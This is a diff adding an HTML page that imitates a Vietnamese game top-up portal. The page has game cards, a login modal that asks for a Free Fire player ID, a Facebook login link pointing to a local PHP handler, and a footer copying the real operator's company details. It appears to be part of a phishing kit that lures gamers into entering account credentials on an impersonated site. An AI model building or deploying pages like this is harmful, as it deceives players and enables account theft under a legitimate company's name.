x+I/l0x5cyGMqtm4fGwqT6/YUO5QUTzpCRzvT+h1nlwsIz/GvPX+F7XJGa57AmixFKeXkmb9CHzsZV8sm2NcIu+o19W+EMwoTF9Qo4ivXw3Bsr66TRUY8a0CRHjJwix+5zeFaPPhUUI8/jugMOeNrlmdISQoFQSx6Gozgf7rz5Zo+RiBQ5bXRTDcARXILagfl5w0NGQsBkeYm/4XgVdAUWLNeFz2+JP7S7fdhu4D+XCpKi/PAQAsSSmBLboYspB0mOYco9Qf/Ks3BcPi1Gl0qqLLv6OTEklsQ0W1myEsIHMZFkDmxmL6tbOeSHALEjhsRSLQVVQuCPdCChy/mvJVoI5ZAbAsQM2MX/6Nah9rQqIUwApLyIhB8nKWoJlu8nIxB7kZcQw+Q76c8yWlmp0UGIFX0vH+PL1hQ4jOb3NaQKtAucw/njX6i/ABlHQ5FravM11RCWnQlikZQzkcl22NHDhx7uAgCZKSIxIlbETCsZlE8zIYzM//TBwzwJzo0bH+bLCoWgpAnEBjrcTaxy/bdhToQwb/5TCUq+hTZ12fIazgYxifkbLbn+f4qp5UwIH0KbuAqk/JR/IyvXFCKyMxALYkJsiFH8ei57zUo9XaJQ8uUfS8aAoc5gU87WI18ymFRBhDAB/kYPQ1nKv14thV+vkhAG2NrlnxOXys+Jd1IS/XMyf9/9EEy86M/D8K04fmu33FN50wOnw4z+qZtyMW2zAVJwk5WaOPRK+Qf3qaDkcK47IcwbpPDPbkuh4Kbhh73Vu0ttiZu07LVF2eZAeXfkgLWmqIYQEs8ZTdjFqNKP4ssjf1JW9EETcbly3aMM7K3llz5OO7tBrQs91/QT4xtKCDNCYfjlkf9cmsdBE+gLK80/9ySiEjsmEeiL4oAEjqqgrlgIQjJ+XEqTRM6XDCckLlFs4MRCnF8EUvifWAcKF79dUnsSARL8IIODfp9DF8iidP+LMkJo0xHhuC8QcRsKPRcdbxGQU4W9EWXLOU2OtQUJ/dhDROUJyHgfBiNsyjmhAh4wnZC4rBy2ioK3ouDzcW08iLFyYXq8jfEopuw5PwO6gd3k7B7/BiQswQvyNOf7mSJASiZFIyRRDvT/HAQLZg7AaMX1EQAkyOW3WXNgzSRGLfgYFpKwJqDfyYM9naUdeCme5pSAxFHoBWeUZwIlQUii7JxeB7BOAzkt2M4AWFx1ewA1x4rNhQ2n0ZWgo9MXcH9oGgPiRyf+xPcEnyskYPNi4yADJ+658cyb2JaD9BWcRpaYf7GPS46QVEDYtAHMyQByIjeQwTkDzdiqcV6DPWf1xwfzcbwsTVPOZaM1tBkkrMH519xAZluxmiLIoin8H8TCsX4EJNV9AAAAAElFTkSuQmCC"
+                                    class="item_plats"><img
+                                    src="data:image/png;base64,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"
+                                    class="item_plats"><img
+                                    src="data:image/png;base64,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"
+                                    class="item_plats">
+                            </div>
+                            <div onclick="Idnguoichoi()" class="btn_change_popup xs-hidden">ID người chơi &gt;&gt;</div>
+                            <div onclick="Idnguoichoi2()" class="btn_change_popup lg-hidden">ID người chơi &gt;&gt;</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="Form" style="display:none" ht-skip="parent">
+                <div>
+                    <div class="loginForm_container">
+                        <div class="base_container">
+                            <div class="form_with_id">
+                                <div class="btnClose" onclick="closeForm2()" ht-close="c-modal"></div>
+                                <div class="titleFormWithId">ID đăng nhập<i class="iconId"></i>
+                                </div>
+                                <form class="detailFormWithId">
+                                    <div class="sectionField"><label for="playerId"
+                                            class="labelField">ID người chơi</label><input id="playerId"
+                                            type="text" placeholder="Hãy nhập UID của bạn" maxlength="64"
+                                            autofocus="true" class="inputField"></div>
+                                    <input class="btnLogin" type="submit" value="Đăng nhập">
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- <div class="c-modal-group" ht-skip="parent">
+                <div class="c_close text--white" ht-close="c-modal"><img src="images/close.png" alt=""></div>
+                <div class="c_body">
+                    <div class="s-login-1">
+                        <div class="s_title">Bảng điều khiển đăng nhập</div>
+                        <div class="s_button">
+                            <a href="/api/v1/login_facebook.php"><img src="images/facebook.png" alt=""> <span>Facebook</span></a>
+                            <div class="s_faifai">
+                                <a href="freefire/login-freefire.php" ><img src="images/iconfaifai.png" alt="">  <div><span>ID Người Chơi</span></div></a>
+                                <span ht-trigger="c-modal-2" ht-target="#modalLogi2"><img src="images/question.png" alt=""></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div> -->
+        </div>
+    </div>
+    <div id="modalLogin3" class="c-modal c-modal-3" ht-close="c-modal-3">
+        <div class="c-modal-box">
+            <div class="c-modal-group" ht-skip="parent">
+                <div class="c_close text--white" ht-close="c-modal-3"><img src="images/close.png" alt=""></div>
+                <div class="c_body">
+                    <img src="images/id.html" alt="">
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="s-menu-1">
+        <div class="s_menu">
+            <ul ht-target="hd-menu">
+                <li class="button"><a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin"><img
+                            src="images/user-2.png" alt="">Đăng nhập</a></li>
+                <li><a href="#">Chăm sóc khách hàng</a></li>
+            </ul>
+        </div>
+        <div class="s_after"></div>
+    </div>
+    <div class="s-slide-1">
+        <div class="container">
+            <div class="b-sslide-ratio">
+                <div class="slick-slider">
+                    <a href="freefire/login-freefire.html"><img src="images/slide1.jpg" alt="" /></a> <!-- LINK -->
+                    <a href="freefire/login-freefire.html"><img src="images/slide2.jpg" alt="" /></a> <!-- LINK -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="s-section-1">
+        <div class="container">
+            <h2 class="s_title"><span>Chọn game để nạp</span></h2>
+            <div class="row row-flex">
+                <div class="col-6 col-sm-4">
+                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1">
+                        <!-- LINK -->
+                        <img src="images/lq.png" alt="">
+                        <h3>Liên Quân Mobile</h3>
+                    </a>
+                </div>
+                <div class="col-6 col-sm-4">
+                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin2" class="b-card-1 faifai" onclick="openLogin()">
+                        <!-- LINK -->
+                        <img src="images/faifai.png" alt="">
+                        <h3>Free Fire</h3>
+                    </a>
+                </div>
+                <div class="col-6 col-sm-4">
+                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1">
+                        <!-- LINK -->
+                        <img src="images/icon.png" alt="">
+                        <h3>Nạp sò</h3>
+                    </a>
+                </div>
+                <div class="col-6 col-sm-4">
+                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1">
+                        <!-- LINK -->
+                        <img src="images/fifa.png" alt="">
+                        <h3>FIFA Online 4 (VN)</h3>
+                    </a>
+                </div>
+                <div class="col-6 col-sm-4">
+                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1">
+                        <!-- LINK -->
+                        <img src="images/fifa4.png" alt="">
+                        <h3>FIFA Online 4 M VN</h3>
+                    </a>
+                </div>
+                <div class="col-6 col-sm-4">
+                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1">
+                        <!-- LINK -->
+                        <img src="images/bns.png" alt="">
+                        <h3>Blade and Soul</h3>
+                    </a>
+                </div>
+                <div class="col-6 col-sm-4">
+                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="b-card-1">
+                        <!-- LINK -->
+                        <img src="images/lol.png" alt="">
+                        <h3>Liên Minh Huyền Thoại</h3>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="s-foolter-1">
+        <div class="container">
+            <ul>
+                <li>CÔNG TY CỔ PHẦN PHÁT TRIỂN THỂ THAO ĐIỆN TỬ VIỆT NAM</li>
+                <li>Giấy CNĐKKD số 0103959912, cấp lần đầu ngày 09/06/2009 | Cơ quan cấp: Phòng Đăng ký kinh doanh- Sở
+                    Kế hoạch và đầu tư TP Hà Nội</li>
+                <li>Địa chỉ trụ sở chính: Tầng 29, Tòa nhà Trung tâm Lotte Hà Nội, số 54 đường Liễu Giai, Phường Cống
+                    Vị, Quận Ba Đình, TP Hà Nội, Việt Nam</li>
+                <li>Điện thoại: 024 73053939</li>
+            </ul>
+            <ul>
+                <li><a href="https://napthe.vn/faq">Câu hỏi thường gặp</a></li> <!-- LINK -->
+                <li><a href="https://napthe.vn/terms">Điều khoản dịch vụ</a></li> <!-- LINK -->
+                <li><a href="https://napthe.vn/privacy">Chính sách bảo mật</a></li> <!-- LINK -->
+            </ul>
+        </div>
+    </div>
+
+    <style type="text/css">
+        body {
+            background-color: #fff;
+        }
+
+        @media screen and (max-width: 480px) {
+            .slick-list.draggable {
+                height: 70px;
+            }
+        }
+
+        @media screen and (min-width: 540px) {
+            .slick-list.draggable {
+                height: 100px;
+            }
+        }
+
+        @media screen and (min-width: 768px) {
+            .slick-list.draggable {
+                height: 120px;
+            }
+        }
+
+
+        @media screen and (min-width: 992px) {
+            .slick-list.draggable {
+                height: 150px;
+            }
+        }
+
+        @media screen and (max-width: 575px) {
+
+            #modalPopup .c-modal-box {
+                top: 120px !important;
+            }
+
+        }
+
+        .banner_1 {
+            padding: 20px;
+            width: 500px;
+            margin: auto;
+            background-color: #fff;
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative
+        }
+
+        @media (-ms-high-contrast:none),
+        screen and (-ms-high-contrast:active) {
+            .banner_1 {
+                margin: 0;
+                -webkit-box-pack: center;
+                -webkit-justify-content: center;
+                -ms-flex-pack: center;
+                justify-content: center;
+                -webkit-box-align: center;
+                -webkit-align-items: center;
+                -ms-flex-align: center;
+                align-items: center
+            }
+        }
+
+        .banner_2 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            width: 100%
+        }
+
+        .banner_2 {
+            height: 500px
+        }
+
+        .banner_3 {
+            max-width: 100%;
+            max-height: 100%;
+            margin: auto;
+            width: auto;
+        }
+
+        .banner_4 {
+            margin: 20px auto 0;
+            width: 200px
+        }
+
+        .banner_5 {
+            display: block;
+            background: #d43831;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 10px 0;
+            border-radius: 3px;
+            cursor: pointer;
+            -webkit-transition: opacity .3s, background-color .3s;
+            transition: opacity .3s, background-color .3s
+        }
+
+        .banner_5:hover {
+            background: #ef4b44
+        }
+
+        .banner_5:active {
+            background: #a32924
+        }
+
+        .banner_5:disabled {
+            opacity: .4;
+            cursor: default
+        }
+
+        .banner_5:disabled:hover {
+            background: #d43831
+        }
+    </style>
+    <script type="text/javascript">
+
+        $(document).ready(function () {
+            $("#btnmodalPopup").click()
+        })
+
+        sessionStorage.removeItem('diamond');
+        sessionStorage.removeItem('type');
+        sessionStorage.removeItem('amount');
+        sessionStorage.removeItem('item');
+
+        function openLogin() {
+            var x = document.getElementById("loginForm");
+            x.style.display = "block";
+        }
+
+        function Idnguoichoi() {
+            var x = document.getElementById("loginForm");
+            x.style.display = "none";
+            var x = document.getElementById("Form");
+            x.style.display = "block";
+        }
+        function closeLogin() {
+            var x = document.getElementById("loginForm");
+            x.style.display = "none";
+        }
+        function closeForm2() {
+            var x = document.getElementById("Form");
+            x.style.display = "none";
+        }
+        function Idnguoichoi2() {
+            window.location = "login.html";
+        }
+    </script>
+<style>.footer,.generic-footer{margin-bottom:98px}@media (min-width:374px){.footer,.generic-footer{margin-bottom:78px}}@media (min-width:546px){.footer,.generic-footer{margin-bottom:56px}}@media (min-width:1055px){.footer,.generic-footer{margin-bottom:0}}.disclaimer{position:fixed;z-index:9999999;bottom:0;right:0;border-top:2px solid #ff5c62;text-align:center;font-size:14px;font-weight:400;background-color:#fff;padding:5px 10px 5px 10px}.disclaimer a:hover{text-decoration:underline}@media (min-width:1052px){.disclaimer{text-align:right;border-left:2px solid red;border-top-left-radius:10px}}@media (min-width:1920px){.disclaimer{width:60%}}</style><div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div></body>
+
+</html>
